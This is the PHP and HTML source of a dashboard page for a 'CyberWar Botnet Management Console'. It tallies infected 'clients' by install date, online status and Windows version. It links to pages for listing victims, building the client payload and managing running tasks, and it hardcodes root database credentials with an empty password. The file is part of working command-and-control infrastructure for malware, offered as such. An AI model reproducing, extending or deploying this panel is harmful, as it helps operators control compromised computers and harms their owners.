<?php
include 'inc/db.php';
include 'inc/config.php';
$db = new db($dbhost, $dbuser, $dbpass, $dbname);

session_start();
if(!isset($_SESSION['username'])) {
    header("Location: error.html");
    die();
}

$clientcountQuery = $db->query('SELECT * FROM clients WHERE TIMESTAMPDIFF(MINUTE,last_seen,NOW()) < 20');
$clientCount = $clientcountQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$lastdayQuery = $db->query('SELECT * FROM `clients` WHERE DATE(`install_date`) = CURDATE()');
$lastday = $lastdayQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$last30daysQuery = $db->query('SELECT * FROM clients WHERE install_date > now() - interval 30 DAY');
$lastMonth = $last30daysQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);
$lastyearQuery = $db->query('SELECT * FROM clients WHERE install_date > now() - interval 365 DAY');
$lastYear = $lastyearQuery->numRows();
$db->close();
$db = new db($dbhost, $dbuser, $dbpass, $dbname);


function Installs($OS){
    $dbhost = 'localhost';
    $dbuser = 'root';
    $dbpass = '';
    $dbname = 'cyberwar';

    $db = new db($dbhost, $dbuser, $dbpass, $dbname);
    switch ($OS) {
        case 10:
            $db = new db($dbhost, $dbuser, $dbpass, $dbname);
            $countInstalls10 = $db->query('SELECT * FROM `clients` WHERE `os` LIKE "%Windows 10%"');
            $countInstalls10 = $countInstalls10->numRows();
            echo $countInstalls10;
            break;
        case 7:
            $db = new db($dbhost, $dbuser, $dbpass, $dbname);
            $countInstalls10 = $db->query('SELECT * FROM `clients` WHERE `os` LIKE "%Windows 7%"');
            $countInstalls10 = $countInstalls10->numRows();
            echo $countInstalls10;
            break;
        case 1:
            $db = new db($dbhost, $dbuser, $dbpass, $dbname);
            $countInstalls10 = $db->query('SELECT * FROM `clients` WHERE `os` LIKE "%Windows Server%"');
            $countInstalls10 = $countInstalls10->numRows();
            echo $countInstalls10;
            break;
    }
}

?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Dashboard - CyberWar</title>
    <meta name="description" content="CyberWar Botnet Management Console">
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome5-overrides.min.css">
</head>

<body id="page-top">
    <div id="wrapper">
        <nav class="navbar navbar-dark align-items-start sidebar sidebar-dark accordion bg-gradient-primary p-0">
            <div class="container-fluid d-flex flex-column p-0"><a class="navbar-brand d-flex justify-content-center align-items-center sidebar-brand m-0" href="#">
                    <div class="sidebar-brand-icon rotate-n-15"><i class="fas fa-laugh-wink"></i></div>
                    <div class="sidebar-brand-text mx-3"><span>CyberWar</span></div>
                </a>
                <hr class="sidebar-divider my-0">
                <ul class="navbar-nav text-light" id="accordionSidebar">
                    <li class="nav-item"><a class="nav-link active" href="index.php"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></a></li>
                    <li class="nav-item"><a class="nav-link" href="clients.php?pageno=1"><i class="fas fa-table"></i><span>Vicitims</span></a></li>
                    <li class="nav-item"><a class="nav-link" href="build.php"><i class="far fa-user-circle"></i><span>Build Client</span></a></li>
                    <li class="nav-item"><a class="nav-link" href="blank.php"><i class="fas fa-window-maximize"></i><span>Running Tasks</span></a></li>
                </ul>
                <div class="text-center d-none d-md-inline"><button class="btn rounded-circle border-0" id="sidebarToggle" type="button"></button></div>
            </div>
        </nav>
        <div class="d-flex flex-column" id="content-wrapper">
            <div id="content">
                <nav class="navbar navbar-light navbar-expand bg-white shadow mb-4 topbar static-top">
                    <div class="container-fluid"><button class="btn btn-link d-md-none rounded-circle me-3" id="sidebarToggleTop" type="button"><i class="fas fa-bars"></i></button>
                        <ul class="navbar-nav flex-nowrap ms-auto">
                            <li class="nav-item dropdown d-sm-none no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><i class="fas fa-search"></i></a>
                                <div class="dropdown-menu dropdown-menu-end p-3 animated--grow-in" aria-labelledby="searchDropdown">
                                    <form class="me-auto navbar-search w-100">
                                        <div class="input-group"><input class="bg-light form-control border-0 small" type="text" placeholder="Search for ...">
                                            <div class="input-group-append"><button class="btn btn-primary py-0" type="button"><i class="fas fa-search"></i></button></div>
                                        </div>
                                    </form>
                                </div>
                            </li>
                            <li class="nav-item dropdown no-arrow mx-1"></li>
                            <li class="nav-item dropdown no-arrow mx-1">
                                <div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#">Settings&nbsp;<i class="fas fa-hand-spock fa-fw"></i></a>
                                    <div class="dropdown-menu dropdown-menu-end dropdown-list animated--grow-in">
                                        <h6 class="dropdown-header">User Center</h6><a class="dropdown-item d-flex align-items-center" href="#">
                                            <div class="fw-bold">
                                                <div class="text-truncate"><span>Settings for: <?php echo $_SESSION['username'];?></span></div>
                                                <p class="small text-gray-500 mb-0"><(^.^<)</p>
                                            </div>
                                        </a><a class="dropdown-item text-center small text-gray-500" href="login.php?logout">LogOut</a>
                                    </div>
                                </div>
                                <div class="shadow dropdown-list dropdown-menu dropdown-menu-end" aria-labelledby="alertsDropdown"></div>
                            </li>
                            <li class="nav-item dropdown no-arrow"></li>
                        </ul>
                    </div>
                </nav>
                <div class="container-fluid">
                    <div class="d-sm-flex justify-content-between align-items-center mb-4">
                        <h3 class="text-dark mb-0">Dashboard</h3><a class="btn btn-primary btn-sm d-none d-sm-inline-block" role="button" href="#"><i class="fas fa-download fa-sm text-white-50"></i>&nbsp;Generate Report</a>
                    </div>
                    <div class="row">
                        <div class="col-md-6 col-xl-3 mb-4">
                            <div class="card shadow border-start-primary py-2">
                                <div class="card-body">
                                    <div class="row align-items-center no-gutters">
                                        <div class="col me-2">
                                            <div class="text-uppercase text-primary fw-bold text-xs mb-1"><span>NeW Connections ToDaY</span></div>
                                            <div class="text-dark fw-bold h5 mb-0"><span><?php echo $lastday;?></span></div>
                                        </div>
                                        <div class="col-auto"><i class="far fa-calendar-times fa-2x text-gray-300"></i></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-xl-3 mb-4">
                            <div class="card shadow border-start-success py-2">
                                <div class="card-body">
                                    <div class="row align-items-center no-gutters">
                                        <div class="col me-2">
                                            <div class="text-uppercase text-success fw-bold text-xs mb-1"><span>NEW CONNECTIONS MONTH</span></div>
                                            <div class="text-dark fw-bold h5 mb-0"><span><?php echo $lastMonth;?></span></div>
                                        </div>
                                        <div class="col-auto"><i class="far fa-calendar-times fa-2x text-gray-300"></i></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-xl-3 mb-4">
                            <div class="card shadow border-start-info py-2">
                                <div class="card-body">
                                    <div class="row align-items-center no-gutters">
                                        <div class="col me-2">
                                            <div class="text-uppercase text-info fw-bold text-xs mb-1"><span>NEW CONNECTIONS YEAR</span></div>
                                            <div class="row g-0 align-items-center">
                                                <div class="col-auto">
                                                    <div class="text-dark fw-bold h5 mb-0 me-3"><span><?php echo $lastYear;?></span></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-auto"><i class="far fa-calendar-times fa-2x text-gray-300"></i></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-xl-3 mb-4">
                            <div class="card shadow border-start-warning py-2">
                                <div class="card-body">
                                    <div class="row align-items-center no-gutters">
                                        <div class="col me-2">
                                            <div class="text-uppercase text-warning fw-bold text-xs mb-1"><span>ONLINE CLIENTS (LAST 20 MINUTES)</span></div>
                                            <div class="text-dark fw-bold h5 mb-0"><span><?php echo $clientCount;?></span></div>
                                        </div>
                                        <div class="col-auto"><i class="fas fa-user fa-2x text-gray-300"></i></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-lg-7 col-xl-8">
                            <div class="card shadow mb-4">
                                <div class="card-header d-flex justify-content-between align-items-center">
                                    <h6 class="text-primary fw-bold m-0">Installs</h6>
                                    <div class="dropdown no-arrow"><button class="btn btn-link btn-sm dropdown-toggle" aria-expanded="false" data-bs-toggle="dropdown" type="button"><i class="fas fa-ellipsis-v text-gray-400"></i></button>
                                        <div class="dropdown-menu shadow dropdown-menu-end animated--fade-in">
                                            <p class="text-center dropdown-header">dropdown header:</p><a class="dropdown-item" href="#">&nbsp;Action</a><a class="dropdown-item" href="#">&nbsp;Another action</a>
                                            <div class="dropdown-divider"></div><a class="dropdown-item" href="#">&nbsp;Something else here</a>
                                        </div>
                                    </div>
                                </div>
                                <div class="card-body">
                                    <div class="chart-area"><canvas data-bss-chart="{&quot;type&quot;:&quot;line&quot;,&quot;data&quot;:{&quot;labels&quot;:[&quot;Jan&quot;,&quot;Feb&quot;,&quot;Mar&quot;,&quot;Apr&quot;,&quot;May&quot;,&quot;Jun&quot;,&quot;Jul&quot;,&quot;Aug&quot;],&quot;datasets&quot;:[{&quot;label&quot;:&quot;Earnings&quot;,&quot;fill&quot;:true,&quot;data&quot;:[&quot;0&quot;,&quot;10000&quot;,&quot;5000&quot;,&quot;15000&quot;,&quot;10000&quot;,&quot;20000&quot;,&quot;15000&quot;,&quot;25000&quot;],&quot;backgroundColor&quot;:&quot;rgba(78, 115, 223, 0.05)&quot;,&quot;borderColor&quot;:&quot;rgba(78, 115, 223, 1)&quot;}]},&quot;options&quot;:{&quot;maintainAspectRatio&quot;:false,&quot;legend&quot;:{&quot;display&quot;:false},&quot;title&quot;:{},&quot;scales&quot;:{&quot;xAxes&quot;:[{&quot;gridLines&quot;:{&quot;color&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;zeroLineColor&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;drawBorder&quot;:false,&quot;drawTicks&quot;:false,&quot;borderDash&quot;:[&quot;2&quot;],&quot;zeroLineBorderDash&quot;:[&quot;2&quot;],&quot;drawOnChartArea&quot;:false},&quot;ticks&quot;:{&quot;fontColor&quot;:&quot;#858796&quot;,&quot;padding&quot;:20}}],&quot;yAxes&quot;:[{&quot;gridLines&quot;:{&quot;color&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;zeroLineColor&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;drawBorder&quot;:false,&quot;drawTicks&quot;:false,&quot;borderDash&quot;:[&quot;2&quot;],&quot;zeroLineBorderDash&quot;:[&quot;2&quot;]},&quot;ticks&quot;:{&quot;fontColor&quot;:&quot;#858796&quot;,&quot;padding&quot;:20}}]}}}"></canvas></div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-5 col-xl-4">
                            <div class="card shadow mb-4">
                                <div class="card-header d-flex justify-content-between align-items-center">
                                    <h6 class="text-primary fw-bold m-0">Installs by OS</h6>
                                </div>
                                <div class="card-body">
                                    <table class="table table-striped">
                                        <thead>
                                            <tr>
                                            <th scope="col">Operating System</th>
                                            <th scope="col">Installs</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                            <td>Windows 10</td>
                                            <td><?php Installs(10);?></td>
                                            </tr>
                                            <tr>
                                            <td>Windows 7</td>
                                            <td><?php Installs(7);?></td>
                                            </tr>
                                            <tr>
                                            <td>Windows Server</td>
                                            <td><?php Installs(1);?></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <footer class="bg-white sticky-footer">
                <div class="container my-auto">
                    <div class="text-center my-auto copyright"><span>Copyright © CyberWar 2021</span></div>
                </div>
            </footer>
        </div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.0-beta2/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.8.0/Chart.bundle.min.js"></script>
    <script src="assets/js/script.min.js"></script>
</body>

</html>